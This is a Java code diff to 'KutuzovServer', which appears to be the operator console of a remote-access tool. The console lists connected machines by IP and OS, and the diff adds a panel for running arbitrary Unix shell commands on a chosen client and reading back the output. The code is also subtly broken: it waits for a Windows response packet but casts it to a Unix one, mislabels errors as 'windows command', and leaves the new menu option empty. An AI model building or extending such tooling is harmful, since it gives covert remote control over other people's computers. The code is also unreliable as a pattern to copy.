@@ -315,6 +315,55 @@ public class KutuzovServer {
         }
     }
 
+    private void user_list_client_unix(Client client) {
+        clearConsole();
+        pnl("ID: " + client.getIdentifierName());
+        pnl("IP: " + client.getIp().substring(0, client.getIp().indexOf(':')));
+        pnl("OS: " + client.getOs());
+        pnl("LocalIP: " + client.getLocalIp());
+        pnl("Options: ");
+        pnl("  0) Go back");
+        pnl("  1) Execute command");
+        pwl("Option: ");
+
+        String input = readLine();
+        int option = input.contentEquals("")?-1:Integer.parseInt(input);
+        switch (option) {
+            case 1: {
+                clearConsole();
+                pwl("Command: ");
+                String command = readLine();
+                try {
+                    client.getOutput().writeObject(new SCUnixCommandPacket(command));
+                    Packet packet = null;
+                    while(packet == null || !(packet instanceof CSWinCommandResponsePacket)) {
+                        try {
+                            packet = (Packet) client.getInput().readObject();
+                        } catch (OptionalDataException exception) { } catch (IOException exception) {
+                            pnl("Failed to receive response from [" + client.getFormattedIdentifierName() + "]! (" + exception.getMessage() + ")");
+                            readLine();
+                            break;
+                        } catch (Exception exception) { }
+                    }
+
+                    if(packet == null)
+                        return;
+                    CSUnixCommandResponsePacket responsePacket = (CSUnixCommandResponsePacket)packet;
+                    String response = responsePacket.response;
+                    pnl("Response: \n  " + response);
+                    readLine();
+                } catch (Exception exception) {
+                    pnl("Failed to send windows command to [" + client.getFormattedIdentifierName() + "]! (" + exception.getMessage() + ")");
+                    readLine();
+                }
+            } break;
+
+            case 0:
+                return;
+            default: break;
+        }
+    }
+
     private void user_list_client(Client client) {
         clearConsole();
         pnl("ID: " + client.getIdentifierName());
@@ -329,6 +378,7 @@ public class KutuzovServer {
         pnl("  4) Windows only options");
         pnl("  5) Beep");
         pnl("  6) KFTP(Kutuzov's File Transfer Protocol)");
+        pnl("  7) Unix only options");
         pwl("Option: ");
         String input = readLine();
         int option = input.contentEquals("")?-1:Integer.parseInt(input);
@@ -369,6 +419,10 @@ public class KutuzovServer {
 
             case 6:
                 KFTPPanel.panel_entry(client);
+                break;
+
+            case 7:
+
                 break;
 
             case 0:
